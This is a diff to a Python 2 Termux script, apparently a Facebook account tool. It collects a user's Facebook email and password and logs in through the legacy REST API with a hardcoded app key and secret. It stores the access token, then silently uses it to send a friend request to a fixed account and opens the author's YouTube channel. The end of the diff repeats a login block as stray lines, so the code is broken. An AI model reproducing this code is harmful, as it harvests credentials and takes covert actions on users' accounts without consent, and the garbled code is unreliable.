@@ -186,16 +186,67 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;93mWarning: \033[1;92mDo Not Use Your Personal Account' )
-		jalan(' \033[1;93mWarning: \033[1;92mUse a New Account To Login' )
-		jalan(' \033[1;93mWarning: \033[1;92mTermux All Version Working' )
-                jalan(' \033[1;91mWarning: \033[1;95mTermux Data Clear Everyday' ) 
-                jalan(' \033[1;91mWarning: \033[1;95mTool Update Everyday 👆' )                
-		print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;92mArshad\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
-		print('\033[1;97m═\x1b[1;91m.........LOGIN WITH FACEBOOK..........\x1b[1;97m═' )
+##### LICENSE #####
+#=================#
+def lisensi():
+	os.system('clear')
+	login()
+####login#########
+def login():
+	os.system('clear')
+	print logo
+	print "\033[1;91m[1]\033[1;47m\033[1;31mLogin With Facebook              \033[1;0m"
+        time.sleep(0.05)
+        print "\033[1;92m[2]\033[1;47m\033[1;31mLogin With Token                 \033[1;0m"
+        time.sleep(0.05)
+        print "\033[1;93m[3]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
+        time.sleep(0.05)
+        print "\033[1;94m[4]\033[1;47m\033[1;31mFriend Request Sent To SYed RaHiM        \033[1;0m"
+        time.sleep(0.05)
+	print "\033[1;95m[5]\033[1;47m\033[1;31mWhatsap t          \033[1;0m"
+        time.sleep(0.05)
+        print "\033[1;96m[0]\033[1;47m\033[1;31mExit                             \033[1;0m"
+	time.sleep(0.05)
+	pilih_login()
+
+def pilih_login():
+	peak = raw_input("\n\033[1;97m[+] \033[0;31mSelect Option: \033[1;91m")
+	if peak =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih_login()
+	elif peak =="1":
+		login1()
+        elif peak =="2":
+	        tokenz()
+        elif peak =="3":
+	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
+	        login()
+        elif peak =="4":
+	        os.system('xdg-open https://youtu.be/5CHTnjNAiqM')
+	        login()
+        elif peak =="5":
+	        os.system('xdg-open https://www.t.me/binyamin001')
+                login()
+	elif peak =="0":
+		keluar()
+        else:
+		print"\033[1;91m[!] Wrong input"
+		keluar()
+
+def login1():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+                time.sleep(0.05)
+		print logo                
+		print "\033[1;97m•-----------------\033[1;37mArshad\033[1;97m-----------------•"
+		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
 		print('	' )
-		id = raw_input('\033[1;97m[●] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;92m')
-		pwd = raw_input('\033[1;97m[●] \x1b[1;96mPassword\x1b[1;97m      : \x1b[1;93m')
+		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
+		pwd = raw_input('\033[1;97m[+] \x1b[1;97mPassword\x1b[1;97m    : \x1b[1;97m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -210,6 +261,63 @@ def login():
 		url = br.geturl()
 		if 'save-device' in url:
 			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\033[1;47m\033[1;91mBinyamin_jan Login Successful\033[1;0m'
+				os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\x1b[1;97mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\x1b[1;97m∆CP∆ Creat A New Account")
+			os.system(' xdg - open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\x1b[1;97mPassword/Email is wrong")
+			os.system('xdg - open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
+			time.sleep(1)
+			login()
+			
+def menu():
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\x1b[1;94mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(o.text)
+		nama = a['name']
+		id = a['id']
+                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+                b = json.loads(t.text)
+                sub = str(b['summary']['total_count'])
+	except KeyError:
+		os.system('clear')
+		print"\033[1;97m∆CP∆Creat A New Account"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\x1b[1;94mThere is no internet connection"
+		keluar()
 				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
 				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
 				x=hashlib.new("md5")
